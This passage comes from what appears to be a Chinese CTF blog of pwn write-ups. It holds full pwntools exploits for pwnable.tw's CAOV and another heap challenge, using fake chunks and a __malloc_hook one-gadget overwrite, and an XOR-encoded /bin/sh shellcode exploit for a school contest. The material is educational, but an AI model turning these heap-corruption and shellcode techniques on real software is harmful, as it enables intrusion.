:&#x27;,color)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">io.sendlineafter(&#x27;choice : &#x27;,&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;choice : &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Which flower do you want to remove from the garden:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">add(0x98,&#x27;0&#x27;,&#x27;0&#x27;)</span><br><span class="line">add(0x18,&#x27;1&#x27;,&#x27;1&#x27;)</span><br><span class="line">dele(0)</span><br><span class="line">add(0x68,&#x27;a&#x27;*8,&#x27;0&#x27;)</span><br><span class="line">show()</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-88-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">realloc=libc_base+libc.symbols[&#x27;__libc_realloc&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">onegadget=[0x45216,0x4526a,0xcc543,0xcc618,0xef6c4,0xef6d0,0xf0567,0xf5b10,0xf0897]</span><br><span class="line"></span><br><span class="line">add(0x68,&#x27;2&#x27;,&#x27;2&#x27;)</span><br><span class="line">add(0x68,&#x27;3&#x27;,&#x27;3&#x27;)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">dele(2)</span><br><span class="line">add(0x68,p64(malloc_hook-0x23),&#x27;2&#x27;)</span><br><span class="line">add(0x68,&#x27;3&#x27;,&#x27;3&#x27;)</span><br><span class="line">add(0x68,&#x27;4&#x27;,&#x27;4&#x27;)</span><br><span class="line">add(0x68,&#x27;a&#x27;*(0x13)+p64(onegadget[8]+libc_base),&#x27;5&#x27;)</span><br><span class="line">dele(4)</span><br><span class="line"></span><br><span class="line">#gdb.attach(io,gdb_args=[&quot;-d&quot;,&quot;../../../pwndbg/glibc-2.23/malloc&quot;])</span><br><span class="line">dele(4)</span><br><span class="line">#io.sendlineafter(&#x27;choice : &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="10-CAOV"><a href="#10-CAOV" class="headerlink" title="10.CAOV"></a>10.CAOV</h3><p>近段时间遇到了好多C++pwn题，但由于太菜，每次都看不懂，因此想在网上找C++pwn题的源码对照ida学习c++pwn，但网上的这种资料太少,四处碰壁后还是靠企鹅才找到了源码。以下是源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line">/* g++ -std=c++11 -Wl,-z,relro,-z,now -o caov caov.cpp */</span><br><span class="line"></span><br><span class="line">#include &lt;bits/stdc++.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Data;</span><br><span class="line"></span><br><span class="line">Data *D;</span><br><span class="line">char name[160];</span><br><span class="line"></span><br><span class="line">class Data</span><br><span class="line">&#123;</span><br><span class="line">    public:</span><br><span class="line">        Data():key(NULL) , value(0), change_count(0)&#123; init_time(); &#125;</span><br><span class="line">        Data(string k, int v)</span><br><span class="line">        &#123;</span><br><span class="line">            key = new char[k.length() + 1];</span><br><span class="line">            strcpy(key, k.c_str());</span><br><span class="line">            value = v;</span><br><span class="line">            change_count = 0;</span><br><span class="line">            update_time();</span><br><span class="line">        &#125;</span><br><span class="line">        Data(const Data &amp;obj)</span><br><span class="line">        &#123;</span><br><span class="line">            key = new char[strlen(obj.key)+1];</span><br><span class="line">            strcpy(key, obj.key);</span><br><span class="line">            value = obj.value;</span><br><span class="line">            change_count = obj.change_count;</span><br><span class="line">            year  = obj.year;</span><br><span class="line">            month = obj.month;</span><br><span class="line">            day   = obj.day;</span><br><span class="line">            hour  = obj.hour;</span><br><span class="line">            min   = obj.min;</span><br><span class="line">            sec   = obj.sec;</span><br><span class="line">        &#125;</span><br><span class="line">        Data operator=(const Data &amp;rhs)</span><br><span class="line">        &#123;</span><br><span class="line">            key = new char[strlen(rhs.key)+1];</span><br><span class="line">            strcpy(key, rhs.key);</span><br><span class="line">            value = rhs.value;</span><br><span class="line">            change_count = rhs.change_count;</span><br><span class="line">            year  = rhs.year;</span><br><span class="line">            month = rhs.month;</span><br><span class="line">            day   = rhs.day;</span><br><span class="line">            hour  = rhs.hour;</span><br><span class="line">            min   = rhs.min;</span><br><span class="line">            sec   = rhs.sec;</span><br><span class="line">        &#125;</span><br><span class="line">        void edit_data()</span><br><span class="line">        &#123;</span><br><span class="line">            if(change_count == 10)</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; &quot;You can only edit your data 10 times at most.&quot; &lt;&lt; endl;</span><br><span class="line">                cout &lt;&lt; &quot;Bye ._.\\~/&quot; &lt;&lt; endl;</span><br><span class="line">                exit(0);</span><br><span class="line">            &#125;</span><br><span class="line">            int old_len = strlen(key);</span><br><span class="line">            unsigned int new_len = 0;</span><br><span class="line">            cout &lt;&lt; &quot;New key length: &quot;;</span><br><span class="line">            cin  &gt;&gt; new_len;</span><br><span class="line">            getchar();</span><br><span class="line">            if(new_len == 0 || new_len &gt; 1000)</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; &quot;Invalid key length&quot; &lt;&lt; endl;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            if (new_len &gt; old_len) key = new char[new_len+1];</span><br><span class="line">            set_data(new_len);</span><br><span class="line">            change_count += 1;</span><br><span class="line">        &#125;   </span><br><span class="line">        void set_data(unsigned int n)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; &quot;Key: &quot;;</span><br><span class="line">            cin.getline(key, n+1); // read n byte + 1 null byte ( auto append )</span><br><span class="line">            cout &lt;&lt; &quot;Value: &quot;;</span><br><span class="line">            cin &gt;&gt; value;</span><br><span class="line">            getchar();</span><br><span class="line">            update_time();</span><br><span class="line">        &#125;</span><br><span class="line">        void update_time()</span><br><span class="line">        &#123;</span><br><span class="line">            time_t cur_time = time(NULL);</span><br><span class="line">            struct tm *now = localtime(&amp;cur_time);</span><br><span class="line">            year = now-&gt;tm_year + 1900;</span><br><span class="line">            month = now-&gt;tm_mon + 1;</span><br><span class="line">            day = now-&gt;tm_mday;</span><br><span class="line">            hour = now-&gt;tm_hour;</span><br><span class="line">            min = now-&gt;tm_min;</span><br><span class="line">            sec = now-&gt;tm_sec;</span><br><span class="line">        &#125;</span><br><span class="line">        void info()</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; &quot;Key: &quot; &lt;&lt; key &lt;&lt; endl;</span><br><span class="line">            cout &lt;&lt; &quot;Value: &quot; &lt;&lt; value &lt;&lt; endl;</span><br><span class="line">            cout &lt;&lt; &quot;Edit count: &quot; &lt;&lt; change_count &lt;&lt; endl;</span><br><span class="line">            cout &lt;&lt; &quot;Last update time: &quot;;</span><br><span class="line">            printf(&quot;%d-%d-%d %d:%d:%d\n&quot;, year, month, day, hour, min, sec);</span><br><span class="line">        &#125;</span><br><span class="line">        ~Data()</span><br><span class="line">        &#123;</span><br><span class="line">            delete[] key;</span><br><span class="line">            key = nullptr;</span><br><span class="line">            value = 0;</span><br><span class="line">            change_count = 0;</span><br><span class="line">            init_time();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    private:</span><br><span class="line">        char *key;</span><br><span class="line">        long value;</span><br><span class="line">        long change_count;</span><br><span class="line">        int year;</span><br><span class="line">        int month;</span><br><span class="line">        int day;</span><br><span class="line">        int hour;</span><br><span class="line">        int min;</span><br><span class="line">        int sec;</span><br><span class="line">        void init_time()</span><br><span class="line">        &#123;</span><br><span class="line">            year  = 0;</span><br><span class="line">            month = 0;</span><br><span class="line">            day   = 0;</span><br><span class="line">            hour  = 0;</span><br><span class="line">            min   = 0;</span><br><span class="line">            sec   = 0;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void set_name()</span><br><span class="line">&#123;</span><br><span class="line">    char tmp[160]=&#123;&#125;;</span><br><span class="line">    char c;</span><br><span class="line">    cout &lt;&lt; &quot;Enter your name: &quot;;</span><br><span class="line">    int cnt = 0;</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">        int len = read(0, &amp;c, 1);</span><br><span class="line">        if(len != 1)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; &quot;Read error&quot; &lt;&lt; endl;</span><br><span class="line">            exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        tmp[cnt++] = c;</span><br><span class="line">        if(c == &#x27;\n&#x27; || cnt == 150)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp[cnt-1] = &#x27;\0&#x27;;</span><br><span class="line">            break;            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    memcpy(name, tmp, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void edit()</span><br><span class="line">&#123;</span><br><span class="line">    Data old;</span><br><span class="line">    old = *D;</span><br><span class="line">    D-&gt;edit_data();</span><br><span class="line">    cout &lt;&lt; &quot;\nYour data info before editing:&quot; &lt;&lt; endl;</span><br><span class="line">    old.info();</span><br><span class="line">    cout &lt;&lt; &quot;\nYour data info after editing:&quot; &lt;&lt; endl;</span><br><span class="line">    D-&gt;info();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void playground()</span><br><span class="line">&#123;</span><br><span class="line">    int choice = 0;</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; &quot;\nMenu&quot; &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; &quot;1. Show name &amp; data&quot; &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; &quot;2. Edit name &amp; data&quot; &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; &quot;3. Exit&quot; &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; &quot;Your choice: &quot;;</span><br><span class="line">        cin &gt;&gt; choice;</span><br><span class="line">        getchar();</span><br><span class="line">        switch(choice)</span><br><span class="line">        &#123;</span><br><span class="line">            case 1:</span><br><span class="line">                cout &lt;&lt; &quot;\nYour name is : &quot;&lt;&lt; name &lt;&lt; endl;</span><br><span class="line">                cout &lt;&lt; &quot;Your data :&quot; &lt;&lt; endl;</span><br><span class="line">                D-&gt;info();</span><br><span class="line">                break;</span><br><span class="line">            case 2:</span><br><span class="line">                set_name();</span><br><span class="line">                edit();</span><br><span class="line">                break;</span><br><span class="line">            case 3:</span><br><span class="line">                cout &lt;&lt; &quot;Bye !&quot; &lt;&lt; endl;</span><br><span class="line">                return;</span><br><span class="line">            default:</span><br><span class="line">                cout &lt;&lt; &quot;Invalid choice !&quot; &lt;&lt; endl;</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;  </span><br><span class="line">    setvbuf(stdin,0, 2, 0);</span><br><span class="line">    setvbuf(stdout,0, 2, 0);</span><br><span class="line">    setvbuf(stderr,0, 2, 0);</span><br><span class="line"></span><br><span class="line">    string k;</span><br><span class="line">    long v;</span><br><span class="line"></span><br><span class="line">    set_name();</span><br><span class="line">    cout &lt;&lt; &quot;Hello ! &quot; &lt;&lt; name &lt;&lt; &quot; !&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;Welcome to Simple key-value DB playground !&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;Please input a key: &quot;;</span><br><span class="line">    cin &gt;&gt; k;</span><br><span class="line">    cout &lt;&lt; &quot;Please input a value: &quot;;</span><br><span class="line">    cin &gt;&gt; v;</span><br><span class="line"></span><br><span class="line">    D = new Data(k, v);</span><br><span class="line">    cout &lt;&lt; &quot;Data create success !&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;Now you can play with your data ^_^&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    playground();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的漏洞点在dele的指针是我们可以控制的</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123170418374.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123170418374.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211123170418374"></p><p>可以看到v4距离ebp0x50的位置</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123170522368.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123170522368.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211123170522368"></p><p>和他共用一个栈帧的函数其中src是我们可控的，也就是说v4可控，因此我们就能够伪造chunk了。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123170611044.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123170611044.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211123170611044"></p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./caov&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27;,10306)</span><br><span class="line">elf=ELF(&#x27;./caov&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc_64.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(name,key,value):</span><br><span class="line">io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line">io.sendlineafter(&#x27;input a key: &#x27;,key)</span><br><span class="line">io.sendlineafter(&#x27;input a value: &#x27;,value)</span><br><span class="line"></span><br><span class="line">def edit(name,length,key,value):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line">io.sendlineafter(&#x27;New key length: &#x27;,str(length))</span><br><span class="line">io.sendafter(&#x27;Key: &#x27;,key)</span><br><span class="line">io.sendlineafter(&#x27;Value: &#x27;,value)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">add(&#x27;f1ag&#x27;,&#x27;a&#x27;*0x10,&#x27;10&#x27;)</span><br><span class="line">payload=p64(0)+p64(0x71)</span><br><span class="line">payload=payload.ljust(0x60,&#x27;\x00&#x27;)</span><br><span class="line">edit(payload+p64(0x6032d0)*2+p64(0)+p64(0x21),0x7,&#x27;b\n&#x27;,&#x27;20&#x27;)</span><br><span class="line">edit(p64(0)+p64(0x71)+p64(0x603288-3),0x67,&#x27;c\n&#x27;,&#x27;30&#x27;)</span><br><span class="line">edit(p64(0)+p64(0x71)+p64(0)*6+p64(0x603280)+p64(0x10),0x67,&#x27;a&#x27;*0xb+p64(0x603300)+&#x27;\n&#x27;,&#x27;30&#x27;)</span><br><span class="line">addr=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base=addr-libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">malloc_hook=libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">gadget=[0x45216,0x4526a,0xef6c4,0xf0567]</span><br><span class="line"></span><br><span class="line">payload=p64(0)+p64(0x71)+p64(0)*6+p64(0x603280)+p64(0x10)+p64(0)</span><br><span class="line">payload=payload.ljust(0x60,&#x27;\x00&#x27;)</span><br><span class="line">edit(payload+p64(0x6032d0)*2+p64(0)+p64(0x21),0x10,&#x27;\n&#x27;,&#x27;20&#x27;)</span><br><span class="line">edit(p64(0)+p64(0x71)+p64(malloc_hook-0x23),0x67,&#x27;\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">edit(p64(0)+p64(0x71),0x67,&#x27;a&#x27;*0x13+p64(gadget[2]+libc_base)+&#x27;\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>西邮第二届校赛</title>
      <link href="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/"/>
      <url>/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="西邮第二届校赛"><a href="#西邮第二届校赛" class="headerlink" title="西邮第二届校赛"></a>西邮第二届校赛</h3><span id="more"></span><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>有一些话想跟刚入门的学弟学妹们说：</p><ul><li><p>请看了题但没有做出来的学弟学妹们不要气馁，因为选择走ctf这条路的人本来就很少，被各种各样的题打垮但却越挫越勇的人更少，走这条路本就很困难，坚持走下去更是难上加难！学长们也都是在打击中慢慢成长起来的（<del>虽然现在还是很菜</del>）。</p></li><li><p>在学习过程中肯定会遇到很多你自己解决不了的问题，要善于去问问题，并不是说你遇到什么问题都去问学长学姐，因为学长学姐的时间也是很宝贵的，虽然很多学长学姐都愿意给你们解答。所以我们要学会怎样高效的问问题，不能直接说这个题我不会，能不能帮忙看一下，我们应该把自己的问题仔细思考，认真概括，不会的点在哪里，出错的地方在哪里，如果有错误的截图将会更好。搜索引擎也是一个帮助我们解决问题很好用的工具，我们入门所做的题目，所用到的工具我想说在谷歌百度上都可以搜到。“在群里问问题一小时不如百度一分钟”。</p></li><li><p>打ctf能带给我们什么？我只想说，是快乐。别人在宿舍里打游戏，你在图书馆或在实验室里打游戏，你们都在打游戏，但你打的游戏能够让你和伙伴们一起拿着公费到全国各地甚至国外吃吃喝喝玩玩，能够让你收获一堆证书奖金，能够让你offer拿到手软，985、211高校也不在话下。这样的游戏谁不爱玩呢？</p></li></ul><p>再说到校赛，实话实说，这次校赛的pwn方向的题对新生来说确实难了，或者换种说法就是这些题不是给刚入门pwn的人做的。<del>反思反思再反思</del> 。所以想学pwn方向的小伙伴们不要恐惧他，事实上他也并不是很难，只要你们勇敢的踏出第一步就会发现pwn也就这样（emmmmm）。</p><p>最后想要学习和打ctf的小伙伴们，欢迎来到A&amp;D网络安全协会，校队（Gleaf）的队员也将从协会中选出，欢迎学弟学妹们的加入！</p><p><img src="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018173843056.png" class="lazyload placeholder" data-srcset="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018173843056.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018173843056"></p><h3 id="1-Gpwn1"><a href="#1-Gpwn1" class="headerlink" title="1.Gpwn1"></a>1.Gpwn1</h3><p>可以看见在init函数中有mmap()函数，这个函数的作用是在内存中映射一段空间，在这里这个空间是可读可写可执行的。</p><p><img src="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018174057975.png" class="lazyload placeholder" data-srcset="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018174057975.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018174057975"></p><p>接着程序对我们的输入进行判断，如果是\x00那么程序结束，如果没有\x00那么输入结束后将会跳转到映射的地址执行shellcode。</p><p><img src="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018174247661.png" class="lazyload placeholder" data-srcset="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018174247661.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018174247661"></p><p>因此只需要我们写入没有\x00的shellcode即可。这种shellcode有很多写法，可以用alpha3，或者自己写一个编码器将shellcode进行异或或其他加密处理。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./Gpwn1&#x27;)</span><br><span class="line">#io = remote(&#x27;127.0.0.1&#x27;,10002)</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">#shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">shellcode = &#x27;mov rax,0x&#x27;+&#x27;/bin/sh\x00&#x27;[::-1].encode(&#x27;hex&#x27;)+&#x27;;push rax;mov rdi,rsp;xor rsi,rsi;xor rdx,rdx;push 59;pop rax;syscall&#x27;</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line">for i in shellcode:</span><br><span class="line">payload += chr(ord(i)^0x44)</span><br><span class="line"></span><br><span class="line">payload1 = &#x27;xor rax,rax;push 0x1;pop rax;shl rax,20;add rax,35;xor rcx,rcx;mov bl,[rax+rcx];xor bl,0x44;mov [rax+rcx],bl;inc rcx;cmp rcx,0x19;jnz $-16;&#x27;</span><br><span class="line">payload1 = asm(payload1)</span><br><span class="line">payload = payload1+payload</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="2-Gpwn2"><a href="#2-Gpwn2" class="headerlink" title="2.Gpwn2"></a>2.Gpwn2</h3><p>好像这个题难度就开始上升了，这个题我是根据今年的国赛题改的，考察的点就是strncmp、strcmp \x00截断绕过。</p><p>程序的功能就是输入账号密码，输入正确后就是简单的栈迁移（<del>好像也不简单</del>）</p><p>用ida分析出密码的MD5哈希值为<code>957b49743a06a938c9246950faadbaa9</code>,MD5在线解密后是如下图所示</p><p><img 